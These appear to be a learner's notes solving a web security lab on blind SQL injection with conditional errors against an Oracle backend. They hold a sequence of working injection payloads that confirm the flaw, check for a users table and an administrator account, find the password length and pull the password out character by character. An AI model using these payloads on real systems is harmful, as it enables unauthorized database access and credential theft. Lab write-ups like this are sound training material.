Lab: Blind SQL injection with conditional errors

 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user. 

To solve the lab, log in as the administrator user.


1) Confirm that the parameter is vulnerable to blind SQLi

' AND  1 = 1--; okay
' AND 1 = 2--; error

' || (select '' from dual) || ' okay, its oracle


2) Confirm that we have a users table

SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual 



' || (select '' from users where rownum =1) || ' 

EXISTS  

' AND (SELECT CASE WHEN EXISTS (SELECT 1 FROM all_tables WHERE table_name='USERS') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--' Error, it exists


2) Confirm that we have a user called administrator

' AND (SELECT CASE WHEN EXISTS (SELECT username FROM users WHERE username='administrator') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--'  It EXISTS


3) How long is the password

' AND (SELECT CASE WHEN EXISTS(SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>20) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--' No error

>19 error
20 its the answer


4) try to get the password

' AND (SELECT CASE WHEN ((select SUBSTR(password,1,1) from users where username='administrator')= 'a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--'


try to see always how is it in every language

session 9bYhj6lBhpp2KGspHxGqGcymI8edYzjh
tracking xalmosWxCNHN4qkC